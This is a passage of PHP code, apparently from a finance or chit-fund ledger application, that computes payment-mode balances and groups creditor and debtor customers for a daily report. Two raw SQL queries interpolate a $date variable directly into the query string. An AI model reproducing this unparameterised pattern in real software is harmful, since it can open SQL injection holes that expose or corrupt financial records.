	// echo "$mainttl->".$mainttl."drcr",$opdrcrList[0]["credittotal"].$opdrcrList[0]["debittotal"];

	$params = $db->getFunctionParam("cftrans");
	$getdata = array();
	for ($a = 0; $a < sizeof($params); $a++) {
		if ($params[$a] == "date") {
			$tmp = array();
			$tmp["op"] = "<";
			$tmp["value"] = $date;
			array_push($getdata, json_encode($tmp));
		} else if ($params[$a] == "fields") {
			array_push($getdata, "sum(credit) as credit,sum(debit) as debit");
		} else if ($params[$a] == "paymentmode") {
			$tmp = array();
			$tmp["op"] = "!=";
			$tmp["value"] = 50;
			array_push($getdata, json_encode($tmp));
		} else if ($params[$a] == "group_by") {
			array_push($getdata, "a.paymentmode");
		} else {
			array_push($getdata, "");
		}
	}

	$opcftransList = call_user_func_array(array($db, 'getCfTrans'), $getdata);
	// $mainttl += $opcftransList[0]["credit"];
	// $mainttl -= $opcftransList[0]["debit"];
	// echo "$mainttl->".$mainttl."cftrans".$opcftransList[0]["credit"].$opcftransList[0]["debit"];

	//start
	if ($opcftransList && sizeof($opcftransList) > 0) {
		for ($f = 0; $f < sizeof($opcftransList); $f++) {
			for ($g = 0; $g < sizeof($opbal); $g++) {
				if ($opcftransList[$f]["paymentmode"] == $opbal[$g]["id"]) {
					$opbal[$g]["amt"] += $opcftransList[$f]["credit"];
					$opbal[$g]["amt"] -= $opcftransList[$f]["debit"];
					// $opbal[$opcftransList[$f]["modename"]]["amt"] = $opcftransList[$f]["opbal"];
					// echo "bfre ".$mainttl;
					// $mainttl += $opcftransList[$f]["credit"];
					// $mainttl -= $opcftransList[$f]["debit"];
					// echo "aftr ".$mainttl;
					break;
				}
			}
		}
	}

	// echo "opbal['main']--->". $mainttl."opcftransList".json_encode($opcftransList);


	// $getpmdata =array();
	// $params = $db->getFunctionParam("pmtrans");
	// for($m=0;$m<sizeof($params);$m++){
	// 	if($params[$m] == "tablename"){
	// 		array_push($getpmdata,"cftrans");
	// 	}else if($params[$m] == "tabledate"){
	// 		$tmp = array();
	// 		$tmp["op"] = "<";
	// 		$tmp["value"] = $date;
	// 		array_push($getpmdata,json_encode($tmp));
	// 	}else if($params[$m] == "fields"){
	// 		array_push($getpmdata,"sum(a.credit) as credit,sum(a.debit) as debit");
	// 	}else if($params[$m] == "group_by"){
	// 		array_push($getpmdata,"a.paymentmode");
	// 	}else{
	// 		array_push($getpmdata,"");
	// 	}
	// }
	// $opbaldrcr = call_user_func_array(array($db,'getPmTrans'),$getpmdata);


	// if($opbaldrcr && sizeof($opbaldrcr) > 0 ){
	// 	for($f=0;$f<sizeof($opbaldrcr);$f++){
	// 		for($g=0;$g<sizeof($opbal);$g++){
	// 			if($opbaldrcr[$f]["paymentmode"] == $opbal[$g]["id"]){
	// 				// $opbal[$g]["amt"] -= $opbaldrcr[$f]["amount"];
	// 				$opbal[$g]["amt"] += $opbaldrcr[$f]["credit"];
	// 				$opbal[$g]["amt"] -= $opbaldrcr[$f]["debit"];
	// 				// $opbal[$opbaldrcr[$f]["modename"]]["amt"] = $opbaldrcr[$f]["opbal"];
	// 				// echo "bfre ".$mainttl;
	// 				// $mainttl += $opbaldrcr[$f]["credit"];
	// 				// $mainttl -= $opbaldrcr[$f]["debit"];
	// 				// // $mainttl -= $opbaldrcr[$f]["amount"];
	// 				// echo "aftr ".$mainttl;
	// 				break;
	// 			}
	// 		}
	// 	}
	// }
	// echo "pmtrans drcr --->".json_encode($opbaldrcr);
	// echo "end opbal -> ".json_encode($opbal).$mainttl;



	//end

	$params = $db->getFunctionParam("receivedamount");
	$getdata = array();
	for ($a = 0; $a < sizeof($params); $a++) {
		if ($params[$a] == "rcvddate") {
			$tmp = array();
			$tmp["op"] = "<";
			$tmp["value"] = $date;
			array_push($getdata, json_encode($tmp));
		} else if ($params[$a] == "fields") {
			array_push($getdata, "sum(a.amount) as amount");
		} else if ($params[$a] == "paymentmode") {
			$tmp = array();
			$tmp["op"] = "!=";
			$tmp["value"] = 50;
			array_push($getdata, json_encode($tmp));
		} else if ($params[$a] == "group_by") {
			array_push($getdata, "a.paymentmode");
		} else {
			array_push($getdata, "");
		}
	}

	$oprcvdamtList = call_user_func_array(array($db, 'getreceivedamount'), $getdata);
	// $mainttl += $oprcvdamtList[0]["amount"];
	// echo json_encode($oprcvdamtList);
	// echo "$mainttl->".$mainttl."rcvdamt".$oprcvdamtList[0]["amount"];


	//start
	if ($oprcvdamtList && sizeof($oprcvdamtList) > 0) {
		for ($f = 0; $f < sizeof($oprcvdamtList); $f++) {
			for ($g = 0; $g < sizeof($opbal); $g++) {
				if ($oprcvdamtList[$f]["paymentmode"] == $opbal[$g]["id"]) {
					$opbal[$g]["amt"] += $oprcvdamtList[$f]["amount"];
					// $opbal[$oprcvdamtList[$f]["modename"]]["amt"] = $oprcvdamtList[$f]["opbal"];
					// echo "bfre ".$mainttl;
					// $mainttl += $oprcvdamtList[$f]["credit"];
					// $mainttl -= $oprcvdamtList[$f]["debit"];
					// echo "aftr ".$mainttl;
					break;
				}
			}
		}
	}

	// echo "opbal['main']--->". $mainttl."oprcvdamtList".json_encode($oprcvdamtList);


	// $getpmdata =array();
	// $params = $db->getFunctionParam("pmtrans");
	// for($m=0;$m<sizeof($params);$m++){
	// 	if($params[$m] == "tablename"){
	// 		array_push($getpmdata,"received");
	// 	}else if($params[$m] == "tabledate"){
	// 		$tmp = array();
	// 		$tmp["op"] = "<";
	// 		$tmp["value"] = $date;
	// 		array_push($getpmdata,json_encode($tmp));
	// 	}else if($params[$m] == "fields"){
	// 		array_push($getpmdata,"sum(a.credit) as credit,sum(a.debit) as debit");
	// 	}else if($params[$m] == "group_by"){
	// 		array_push($getpmdata,"a.paymentmode");
	// 	}else{
	// 		array_push($getpmdata,"");
	// 	}
	// }
	// $opbaldrcr = call_user_func_array(array($db,'getPmTrans'),$getpmdata);


	// if($opbaldrcr && sizeof($opbaldrcr) > 0 ){
	// 	for($f=0;$f<sizeof($opbaldrcr);$f++){
	// 		for($g=0;$g<sizeof($opbal);$g++){
	// 			if($opbaldrcr[$f]["paymentmode"] == $opbal[$g]["id"]){
	// 				// $opbal[$g]["amt"] -= $opbaldrcr[$f]["amount"];
	// 				$opbal[$g]["amt"] += $opbaldrcr[$f]["credit"];
	// 				$opbal[$g]["amt"] -= $opbaldrcr[$f]["debit"];
	// 				// $opbal[$opbaldrcr[$f]["modename"]]["amt"] = $opbaldrcr[$f]["opbal"];
	// 				// echo "bfre ".$mainttl;
	// 				// $mainttl += $opbaldrcr[$f]["credit"];
	// 				// $mainttl -= $opbaldrcr[$f]["debit"];
	// 				// // $mainttl -= $opbaldrcr[$f]["amount"];
	// 				// echo "aftr ".$mainttl;
	// 				break;
	// 			}
	// 		}
	// 	}
	// }
	// echo "pmtrans drcr --->".json_encode($opbaldrcr);
	// echo "end opbal -> ".json_encode($opbal).$mainttl;



	//end

	$params = $db->getFunctionParam("chiti");
	$getdata = array();
	for ($a = 0; $a < sizeof($params); $a++) {
		if ($params[$a] == "date") {
			$tmp = array();
			$tmp["op"] = "<";
			$tmp["value"] = $date;
			array_push($getdata, json_encode($tmp));
		} else if ($params[$a] == "fields") {
			array_push($getdata, "sum(amount) as amount,sum(ccomm) as ccomm,sum(suriccomm) as suriccomm");
		} else if ($params[$a] == "paymentmode") {
			$tmp = array();
			$tmp["op"] = "!=";
			$tmp["value"] = 50;
			array_push($getdata, json_encode($tmp));
		} else if ($params[$a] == "group_by") {
			array_push($getdata, "a.paymentmode");
		} else {
			array_push($getdata, "");
		}
	}

	$opchititList = call_user_func_array(array($db, 'getchiti'), $getdata);
	// echo "$mainttl->".$mainttl."chiti".($opchititList[0]["amount"] - $opchititList[0]["ccomm"] - $opchititList[0]["suriccomm"]);
	// echo "mainttl->".$opbal[0]["amt"].json_encode($opchititList);
	if ($opchititList && sizeof($opchititList) > 0) {
		for ($f = 0; $f < sizeof($opchititList); $f++) {
			for ($g = 0; $g < sizeof($opbal); $g++) {
				if ($opchititList[$f]["paymentmode"] == $opbal[$g]["id"]) {
					// echo "bfre ".$opbal[$g]["name"]."-".$opbal[0]["amt"];
					$opbal[$g]["amt"] -= $opchititList[$f]["amount"] - $opchititList[$f]["ccomm"] - $opchititList[$f]["suriccomm"];
					// echo "bfre ".$opbal[$g]["name"]."-".$opbal[0]["amt"];
					// $opbal[$g]["amt"] -= $opchititList[0]["amount"] - $opchititList[0]["ccomm"] - $opchititList[0]["suriccomm"] ;
					// $opbal[$opchititList[$f]["modename"]]["amt"] = $opchititList[$f]["opbal"];
					// $mainttl += $opchititList[$f]["credit"];
					// $mainttl -= $opchititList[$f]["debit"];
					// echo "aftr ".$mainttl;
					break;
				}
			}
		}
	}


	//only chiti of multi pmmode fr ccomm
	$ccommList = $db->getmultiRecord("SELECT sum(ccomm) as ccomm,ccommpaymentmode as ccommpaymentmode FROM `chiti` where paymentmode = 50 and date < '$date'  AND deleted = 0 GROUP BY ccommpaymentmode");

	// echo "$mainttl->".$mainttl."chiti".($opchititList[0]["amount"] - $opchititList[0]["ccomm"] - $opchititList[0]["suriccomm"]);
	// echo "ccommList->".json_encode($ccommList);
	if ($ccommList && sizeof($ccommList) > 0) {
		for ($f = 0; $f < sizeof($ccommList); $f++) {
			for ($g = 0; $g < sizeof($opbal); $g++) {
				if ($ccommList[$f]["ccommpaymentmode"] == $opbal[$g]["id"]) {
					$opbal[$g]["amt"] += $ccommList[$f]["ccomm"];
					break;
				}
			}
		}
	}




	$getpmdata = array();
	$params = $db->getFunctionParam("pmtrans");
	for ($m = 0; $m < sizeof($params); $m++) {
		if ($params[$m] == "date") {
			$tmp = array();
			$tmp["op"] = "<";
			$tmp["value"] = $date;
			array_push($getpmdata, json_encode($tmp));
		} else if ($params[$m] == "fields") {
			array_push($getpmdata, "sum(a.credit) as credit,sum(a.debit) as debit");
		} else if ($params[$m] == "group_by") {
			array_push($getpmdata, "a.paymentmode");
		} else {
			array_push($getpmdata, "");
		}
	}
	$opbalpmtrans = call_user_func_array(array($db, 'getPmTrans'), $getpmdata);


	if ($opbalpmtrans && sizeof($opbalpmtrans) > 0) {
		for ($f = 0; $f < sizeof($opbalpmtrans); $f++) {
			for ($g = 0; $g < sizeof($opbal); $g++) {
				if ($opbalpmtrans[$f]["paymentmode"] == $opbal[$g]["id"]) {
					// $opbal[$g]["amt"] -= $opbalpmtrans[$f]["amount"];
					$opbal[$g]["amt"] += $opbalpmtrans[$f]["credit"];
					$opbal[$g]["amt"] -= $opbalpmtrans[$f]["debit"];
					// $opbal[$opbalpmtrans[$f]["modename"]]["amt"] = $opbalpmtrans[$f]["opbal"];
					// echo "bfre ".$mainttl;
					// $mainttl += $opbalpmtrans[$f]["credit"];
					// $mainttl -= $opbalpmtrans[$f]["debit"];
					// // $mainttl -= $opbalpmtrans[$f]["amount"];
					// echo "aftr ".$mainttl;
					break;
				}
			}
		}
	}

	for ($u = 1; $u < sizeof($opbal); $u++) {
		$opbal[0]["amt"] += $opbal[$u]["amt"];
	}

	$closingbal = $opbal;
	for ($f = 1; $f < sizeof($closingbal); $f++) {
		$closingbal[0]["amt"] -= $closingbal[$f]["amt"];
	}
	// echo "pmtrans drcr --->".json_encode($opbalpmtrans);
	// echo "end opbal -> ".json_encode($opbal).$mainttl;


	//creditors section
	$notids = array();
	$pmids = array();

	$params = $db->getFunctionParam("receivedamount");
	$getdata = array();
	for ($b = 0; $b < sizeof($params); $b++) {
		if ($params[$b] == "rcvddate") {
			array_push($getdata, $date);
		} else {
			array_push($getdata, "");
		}
	}

	$rcvdamtList = call_user_func_array(array($db, 'getreceivedamount'), $getdata);
	if ($rcvdamtList && sizeof($rcvdamtList)) {
		for ($c = 0; $c < sizeof($rcvdamtList); $c++) {
			($rcvdamtList[$c]["colid"]) ? array_push($notids, $rcvdamtList[$c]["colid"]) : "";
			array_push($crcustomerids, $rcvdamtList[$c]["customer"]);
			($rcvdamtList[$c]["paymentmode"] == 50) ? array_push($pmids, $rcvdamtList[$c]["pmid"]) : "";
			if ($rcvdamtList[$c]["paymentmode"] != 50) {
				for ($f = 0; $f < sizeof($closingbal); $f++) {
					if ($rcvdamtList[$c]["paymentmode"] == $closingbal[$f]["id"]) {
						$closingbal[$f]["amt"] += $rcvdamtList[$c]["amount"];
						break;
					}
				}
			}
		}
		$creditors["total"] += getsum($rcvdamtList, "amount");
	}

	// echo json_encode($notids);
	$params = $db->getFunctionParam("collection");
	$getdata = array();
	for ($b = 0; $b < sizeof($params); $b++) {
		if ($params[$b] == "id") {
			$tmp = array();
			$tmp["op"] = "Not In";
			$tmp["value"] = implode(',', $notids);
			array_push($getdata, json_encode($tmp));
		} else if ($params[$b] == "rcvddate") {
			array_push($getdata, $date);
		} else {
			array_push($getdata, "");
		}
	}

	$collectionList = call_user_func_array(array($db, 'getcollection'), $getdata);
	// echo json_encode($collectionList);

	if ($collectionList && sizeof($collectionList)) {
		for ($f = 0; $f < sizeof($collectionList); $f++) {
			array_push($crcustomerids, $collectionList[$f]["receivedfrom"]);
		}
	}





	$params = $db->getFunctionParam("drcr");
	$getdata = array();
	for ($b = 0; $b < sizeof($params); $b++) {
		if ($params[$b] == "date") {
			array_push($getdata, $date);
		} else if ($params[$b] == "showdaybook") {
			$tmp = array();
			$tmp["op"] = "!=";
			$tmp["value"] = 2;
			array_push($getdata, json_encode($tmp));
		} else if ($params[$b] == "note") {
			$tmp = array();
			$tmp["op"] = "!=";
			$tmp["value"] = "interestcal";
			array_push($getdata, json_encode($tmp));
		} else {
			array_push($getdata, "");
		}
	}

	$drcrList = call_user_func_array(array($db, 'getdrcr'), $getdata);
	if ($drcrList && sizeof($drcrList)) {
		for ($d = 0; $d < sizeof($drcrList); $d++) {
			if ($drcrList[$d]["credit"] > 0) {
				array_push($crcustomerids, $drcrList[$d]["customer"]);
				$creditors["total"] += $drcrList[$d]["credit"];
			}
			if ($drcrList[$d]["debit"] > 0) {
				array_push($drcustomerids, $drcrList[$d]["customer"]);
				// echo "drcus".json_encode($drcustomerids);
				$debitors["total"] += $drcrList[$d]["debit"];
			}
			if ($drcrList[$d]["paymentmode"] != 50) {
				for ($f = 0; $f < sizeof($closingbal); $f++) {
					if ($drcrList[$d]["paymentmode"] == $closingbal[$f]["id"]) {
						$closingbal[$f]["amt"] += $drcrList[$d]["credit"];
						$closingbal[$f]["amt"] -= $drcrList[$d]["debit"];
						break;
					}
				}
			}
			($drcrList[$d]["paymentmode"] == 50) ? array_push($pmids, $drcrList[$d]["pmid"]) : "";
		}
		// if($creditors["drcrlist"] && sizeof($creditors["drcrlist"]) > 0){
		// 	$creditors["disp"]["drcr"] = 1;				
		// }
		// if($debitors["drcrlist"] && sizeof($debitors["drcrlist"]) > 0){
		// 	$debitors["disp"]["drcr"] = 1;
		// }
	}
	// echo "drcr".$debitors["total"];


	$params = $db->getFunctionParam("cftrans");
	$getdata = array();
	for ($b = 0; $b < sizeof($params); $b++) {
		if ($params[$b] == "date") {
			array_push($getdata, $date);
		} else {
			array_push($getdata, "");
		}
	}
	$cftransList = call_user_func_array(array($db, 'getCfTrans'), $getdata);
	if ($cftransList && sizeof($cftransList)) {
		for ($e = 0; $e < sizeof($cftransList); $e++) {
			if ($cftransList[$e]["credit"] > 0) {
				array_push($crcustomerids, $cftransList[$e]["maincus"]);
				$creditors["total"] += $cftransList[$e]["credit"];
			}
			if ($cftransList[$e]["debit"] > 0) {
				array_push($drcustomerids, $cftransList[$e]["maincus"]);
				// echo "drcus".json_encode($drcustomerids);
				$debitors["total"] += $cftransList[$e]["debit"];
			}
			if ($cftransList[$e]["paymentmode"] != 50) {
				for ($f = 0; $f < sizeof($closingbal); $f++) {
					if ($cftransList[$e]["paymentmode"] == $closingbal[$f]["id"]) {
						$closingbal[$f]["amt"] += $cftransList[$e]["credit"];
						$closingbal[$f]["amt"] -= $cftransList[$e]["debit"];
						break;
					}
				}
			}
			($cftransList[$e]["paymentmode"] == 50) ? array_push($pmids, $cftransList[$e]["pmid"]) : "";
		}
		// if($creditors["cftranslist"] && sizeof($creditors["cftranslist"]) > 0){
		// 	$creditors["disp"]["cftrans"] = 1;	
		// }
		// if($debitors["cftranslist"] && sizeof($debitors["cftranslist"]) > 0){
		// 	$debitors["disp"]["cftrans"] = 1;
		// }
	}

	// echo "cftrans".$debitors["total"];

	$params = $db->getFunctionParam("interest");
	$getdata = array();
	for ($b = 0; $b < sizeof($params); $b++) {
		if ($params[$b] == "date") {
			array_push($getdata, $date);
		} else if ($params[$b] == "debit") {
			$tmp = array();
			$tmp["op"] = ">=";
			$tmp["value"] = "1";
			array_push($getdata, json_encode($tmp));
		} else {
			array_push($getdata, "");
		}
	}
	$interestList = call_user_func_array(array($db, 'getInterest'), $getdata);
	if ($interestList && sizeof($interestList)) {
		for ($j = 0; $j < sizeof($interestList); $j++) {
			array_push($drcustomerids, $interestList[$j]["customer"]);
			// echo "drcus".json_encode($drcustomerids);
			$debitors["total"] += $interestList[$j]["debit"];
			if ($interestList[$j]["paymentmode"] != 50) {
				for ($f = 0; $f < sizeof($closingbal); $f++) {
					if ($interestList[$j]["paymentmode"] == $closingbal[$f]["id"]) {
						$closingbal[$f]["amt"] -= $interestList[$j]["debit"];
						break;
					}
				}
			}
			($interestList[$j]["paymentmode"] == 50) ? array_push($pmids, $interestList[$j]["pmid"]) : "";
		}
		// if($creditors["cftranslist"] && sizeof($creditors["cftranslist"]) > 0){
		// 	$creditors["disp"]["cftrans"] = 1;	
		// }
		// if($debitors["cftranslist"] && sizeof($debitors["cftranslist"]) > 0){
		// 	$debitors["disp"]["cftrans"] = 1;
		// }
	}



	$params = $db->getFunctionParam("chiti");
	$getdata = array();
	for ($b = 0; $b < sizeof($params); $b++) {
		if ($params[$b] == "date") {
			array_push($getdata, $date);
		} else {
			array_push($getdata, "");
		}
	}
	$chitiList = call_user_func_array(array($db, 'getchiti'), $getdata);
	if ($chitiList && sizeof($chitiList)) {
		for ($j = 0; $j < sizeof($chitiList); $j++) {
			if ($chitiList[$j]["ccomm"] > 0 || $chitiList[$j]["suriccomm"] > 0) {
				array_push($crcustomerids, $chitiList[$j]["customer"]);
			}
			array_push($drcustomerids, $chitiList[$j]["customer"]);
			// echo "drcus".json_encode($drcustomerids);
			$debitors["total"] += $chitiList[$j]["amount"];
			$creditors["total"] += $chitiList[$j]["ccomm"];
			$creditors["total"] += $chitiList[$j]["suriccomm"];
			if ($chitiList[$j]["paymentmode"] != 50) {
				for ($f = 0; $f < sizeof($closingbal); $f++) {
					if ($chitiList[$j]["paymentmode"] == $closingbal[$f]["id"]) {
						$closingbal[$f]["amt"] -= $chitiList[$j]["amount"];
						// break;
					}
					if ($chitiList[$j]["ccommpaymentmode"] == $closingbal[$f]["id"]) {
						$closingbal[$f]["amt"] += $chitiList[$j]["ccomm"];
						// $closingbal[$f]["amt"] += $chitiList[$j]["suriccomm"];
					}
				}
			}
			($chitiList[$j]["paymentmode"] == 50) ? array_push($pmids, $chitiList[$j]["pmid"]) : "";
		}
	}


	//only chiti of multi pmmode fr ccomm
	$ccommList1 = $db->getmultiRecord("SELECT sum(ccomm) as ccomm,ccommpaymentmode as ccommpaymentmode FROM `chiti` where paymentmode = 50 and date = '$date'  AND deleted = 0 GROUP BY ccommpaymentmode");

	// echo "$mainttl->".$mainttl."chiti".($opchititList[0]["amount"] - $opchititList[0]["ccomm"] - $opchititList[0]["suriccomm"]);
	// echo "ccommList1->".json_encode($ccommList1);
	if ($ccommList1 && sizeof($ccommList1) > 0) {
		for ($f = 0; $f < sizeof($ccommList1); $f++) {
			for ($g = 0; $g < sizeof($closingbal); $g++) {
				if ($ccommList1[$f]["ccommpaymentmode"] == $closingbal[$g]["id"]) {
					$closingbal[$g]["amt"] += $ccommList1[$f]["ccomm"];
					break;
				}
			}
		}
	}


	// echo "interest".$debitors["total"];

	// echo json_encode($debitors);
	// echo json_encode($creditors);
	// echo $creditors["total"];
	if ($crcustomerids && sizeof($crcustomerids)) {
		$crcustomerids = array_unique($crcustomerids);
		$params = $db->getFunctionParam("customers");
		$getdata = array();
		for ($b = 0; $b < sizeof($params); $b++) {
			// echo $params[$b]."-";
			if ($params[$b] == "id") {
				$tmp = array();
				$tmp["op"] = "In";
				$tmp["value"] = implode(',', $crcustomerids);
				array_push($getdata, json_encode($tmp));
			} else if ($params[$b] == "sort_by") {
				array_push($getdata, "a.firstname");
			} else if ($params[$b] == "sort_order") {
				array_push($getdata, "asc");
			} else {
				array_push($getdata, "");
			}
		}
		// echo json_encode($getdata);
		$crcustomersList = call_user_func_array(array($db, 'getcustomers'), $getdata);
		if ($crcustomersList && sizeof($crcustomersList)) {
			$creditors["customers"] = $crcustomersList;
		}
	} else {
		$creditors["customers"] = array();
	}


	if ($drcustomerids && sizeof($drcustomerids)) {
		// echo "drcus".json_encode($drcustomerids);
		$drcustomerids = array_unique($drcustomerids);
		$params = $db->getFunctionParam("customers");
		$getdata = array();
		for ($b = 0; $b < sizeof($params); $b++) {
			// echo $b;
			if ($params[$b] == "id") {
				$tmp = array();
				$tmp["op"] = "In";
				$tmp["value"] = implode(',', $drcustomerids);
				array_push($getdata, json_encode($tmp));
			} else if ($params[$b] == "sort_by") {
				array_push($getdata, "a.firstname");
			} else if ($params[$b] == "sort_order") {
				array_push($getdata, "asc");
			} else {
				array_push($getdata, "");
			}
		}
		$drcustomersList = call_user_func_array(array($db, 'getcustomers'), $getdata);
		if ($drcustomersList && sizeof($drcustomersList)) {
			$debitors["customers"] = $drcustomersList;
		}
	} else {
		$debitors["customers"] = array();
	}

	if ($pmids && sizeof($pmids)) {
		$getpmdata = array();
		$params = $db->getFunctionParam("pmtrans");
		for ($m = 0; $m < sizeof($params); $m++) {
			if ($params[$m] == "id") {
				$tmp = array();
				$tmp["op"] = "In";
				$tmp["value"] = implode(',', $pmids);
				array_push($getpmdata, json_encode($tmp));
			} else {
				array_push($getpmdata, "");
			}
		}
		$pmtransList = call_user_func_array(array($db, 'getPmTrans'), $getpmdata);
		for ($k = 0; $k < sizeof($pmtransList); $k++) {
			for ($f = 0; $f < sizeof($closingbal); $f++) {
				if ($pmtransList[$k]["paymentmode"] == $closingbal[$f]["id"]) {
					$closingbal[$f]["amt"] += $pmtransList[$k]["credit"];
					$closingbal[$f]["amt"] -= $pmtransList[$k]["debit"];
					break;
				}
			}
		}
	}



	//will start making a sorted array 
	if ($creditors["customers"] && sizeof($creditors["customers"])) {
		for ($g = 0; $g < sizeof($creditors["customers"]); $g++) {
			$creditors["customers"][$g]["disp"] = array();
			$creditors["customers"][$g]["total"] = 0;

			//rcvdamtlist 
			$creditors["customers"][$g]["disp"]["rcvdamt"] = 0;
			$creditors["customers"][$g]["rcvdamtlist"] = array();
			if ($rcvdamtList && sizeof($rcvdamtList)) {
				for ($h = 0; $h < sizeof($rcvdamtList); $h++) {
					if ($rcvdamtList[$h]["customer"] == $creditors["customers"][$g]["id"]) {
						// if($rcvdamtList[$h]["paymentmode"] == 50 && $rcvdamtList[$h]["pmid"]){
						// 	// echo "camein";
						// 	$rcvdamtList[$h]["pmtrans"] = array();
						// 	$tmppmid = array();
						// 	$tmppmid = explode(",",$rcvdamtList[$h]["pmid"]);
						// 	// echo json_encode($tmppmid);
						// 	for($x=0;$x<sizeof($tmppmid);$x++){//deleted pmids array
						// 		for($w=0;$w<sizeof($pmtransList);$w++){//deleted pmids array
						// 			if($tmppmid[$x] == $pmtransList[$w]["id"]){
						// 				// echo "bfre".json_encode($rcvdamtList[$h]["pmtrans"]);
						// 				array_push($rcvdamtList[$h]["pmtrans"],$pmtransList[$w]);
						// 				// echo "after".json_encode($rcvdamtList[$h]["pmtrans"]);
						// 				unset($pmtransList[$w]);
						// 				$pmtransList =  array_values($pmtransList);
						// 				break;
						// 			}
						// 		}
						// 	}
						// 	// echo "final".json_encode($rcvdamtList[$h]["pmtrans"]);

						// }
						if ($pmtransList && sizeof($pmtransList)) {
							$tmppmtrans = sortPmtrans($rcvdamtList[$h], $pmtransList);
							$rcvdamtList[$h]['pmtrans'] = $tmppmtrans[0];
							$pmtransList = $tmppmtrans[1];
						}
						// echo sizeof($pmtransList);

						$creditors["customers"][$g]["disp"]["rcvdamt"] = 1;
						$creditors["customers"][$g]["total"] += $rcvdamtList[$h]["amount"];
						array_push($creditors["customers"][$g]["rcvdamtlist"], $rcvdamtList[$h]);
					}
				}
			}


			//collectionlist
			$creditors["customers"][$g]["disp"]["collection"] = 0;
			$creditors["customers"][$g]["collectionlist"] = array();
			if ($collectionList && sizeof($collectionList)) {
				for ($f = 0; $f < sizeof($collectionList); $f++) {
					if ($collectionList[$f]["receivedfrom"] == $creditors["customers"][$g]["id"]) {
						$creditors["customers"][$g]["disp"]["collection"] = 1;
						array_push($creditors["customers"][$g]["collectionlist"], $collectionList[$f]);
					}
				}
			}

			//drcrList
			$creditors["customers"][$g]["disp"]["drcr"] = 0;
			$creditors["customers"][$g]["drcrlist"] = array();
			if ($drcrList && sizeof($drcrList)) {
				for ($d = 0; $d < sizeof($drcrList); $d++) {
					if ($drcrList[$d]["credit"] > 0 && $drcrList[$d]["customer"] == $creditors["customers"][$g]["id"]) {
						// if($drcrList[$d]["paymentmode"] == 50 && $drcrList[$d]["pmid"]){
						// 	// echo "camein";
						// 	$drcrList[$d]["pmtrans"] = array();
						// 	$tmppmid = array();
						// 	$tmppmid = explode(",",$drcrList[$d]["pmid"]);
						// 	// echo json_encode($tmppmid);
						// 	for($x=0;$x<sizeof($tmppmid);$x++){//deleted pmids array
						// 		for($w=0;$w<sizeof($pmtransList);$w++){//deleted pmids array
						// 			if($tmppmid[$x] == $pmtransList[$w]["id"]){
						// 				// echo "bfre".json_encode($drcrList[$d]["pmtrans"]);
						// 				array_push($drcrList[$d]["pmtrans"],$pmtransList[$w]);
						// 				// echo "after".json_encode($drcrList[$d]["pmtrans"]);
						// 				unset($pmtransList[$w]);
						// 				$pmtransList =  array_values($pmtransList);
						// 				break;
						// 			}
						// 		}
						// 	}
						// 	// echo "final".json_encode($drcrList[$d]["pmtrans"]);

						// }
						if ($pmtransList && sizeof($pmtransList)) {
							$tmppmtrans = sortPmtrans($drcrList[$d], $pmtransList);
							$drcrList[$d]['pmtrans'] = $tmppmtrans[0];
							$pmtransList = $tmppmtrans[1];
						}
						// echo sizeof($pmtransList);
						array_push($creditors["customers"][$g]["drcrlist"], $drcrList[$d]);
						$creditors["customers"][$g]["disp"]["drcr"] = 1;
						$creditors["customers"][$g]["total"] += $drcrList[$d]["credit"];
						// $creditors["total"] += $drcrList[$d]["credit"];
						// }else if($drcrList[$d]["debit"] > 0 && $drcrList[$d]["customer"] == $debitors["customers"][$g]["id"]){
						// 	array_push($drcustomerids,$drcrList[$d]["customer"]);
						// 	array_push($debitors["drcrlist"],$drcrList[$d]);
						// 	$debitors["total"] += $drcrList[$d]["debit"];
					}
				}
				// if($creditors["drcrlist"] && sizeof($creditors["drcrlist"]) > 0){
				// 	$creditors["disp"]["drcr"] = 1;				
				// }
				// if($debitors["drcrlist"] && sizeof($debitors["drcrlist"]) > 0){
				// 	$debitors["disp"]["drcr"] = 1;
				// }
			}


			//cftransList
			$creditors["customers"][$g]["disp"]["cftrans"] = 0;
			$creditors["customers"][$g]["cftranslist"] = array();
			if ($cftransList && sizeof($cftransList)) {
				for ($d = 0; $d < sizeof($cftransList); $d++) {
					if ($cftransList[$d]["credit"] > 0 && $cftransList[$d]["maincus"] == $creditors["customers"][$g]["id"]) {
						// if($cftransList[$d]["paymentmode"] == 50 && $cftransList[$d]["pmid"]){
						// 	// echo "camein";
						// 	$cftransList[$d]["pmtrans"] = array();
						// 	$tmppmid = array();
						// 	$tmppmid = explode(",",$cftransList[$d]["pmid"]);
						// 	// echo json_encode($tmppmid);
						// 	for($x=0;$x<sizeof($tmppmid);$x++){//deleted pmids array
						// 		for($w=0;$w<sizeof($pmtransList);$w++){//deleted pmids array
						// 			if($tmppmid[$x] == $pmtransList[$w]["id"]){
						// 				// echo "bfre".json_encode($cftransList[$d]["pmtrans"]);
						// 				array_push($cftransList[$d]["pmtrans"],$pmtransList[$w]);
						// 				// echo "after".json_encode($cftransList[$d]["pmtrans"]);
						// 				unset($pmtransList[$w]);
						// 				$pmtransList =  array_values($pmtransList);
						// 				break;
						// 			}
						// 		}
						// 	}
						// 	// echo "final".json_encode($cftransList[$d]["pmtrans"]);

						// }
						if ($pmtransList && sizeof($pmtransList)) {
							$tmppmtrans = sortPmtrans($cftransList[$d], $pmtransList);
							$cftransList[$d]['pmtrans'] = $tmppmtrans[0];
							$pmtransList = $tmppmtrans[1];
						}
						array_push($creditors["customers"][$g]["cftranslist"], $cftransList[$d]);
						$creditors["customers"][$g]["disp"]["cftrans"] = 1;
						$creditors["customers"][$g]["total"] += $cftransList[$d]["credit"];
						// $creditors["total"] += $cftransList[$d]["credit"];
						// }else if($cftransList[$d]["debit"] > 0 && $cftransList[$d]["customer"] == $debitors["customers"][$g]["id"]){
						// 	array_push($drcustomerids,$cftransList[$d]["customer"]);
						// 	array_push($debitors["cftranslist"],$cftransList[$d]);
						// 	$debitors["total"] += $cftransList[$d]["debit"];
					}
				}
			}

			//newchitiCComm
			$creditors["customers"][$g]["disp"]["ccomm"] = 0;
			$creditors["customers"][$g]["ccommlist"] = array();
			if ($chitiList && sizeof($chitiList)) {
				for ($h = 0; $h < sizeof($chitiList); $h++) {
					if ($chitiList[$h]["customer"] == $creditors["customers"][$g]["id"] && ($chitiList[$h]["ccomm"] > 0 || $chitiList[$h]["suriccomm"] > 0)) {
						array_push($creditors["customers"][$g]["ccommlist"], $chitiList[$h]);
						$creditors["customers"][$g]["total"] += $chitiList[$h]["ccomm"];
						$creditors["customers"][$g]["total"] += $chitiList[$h]["suriccomm"];
					}
				}
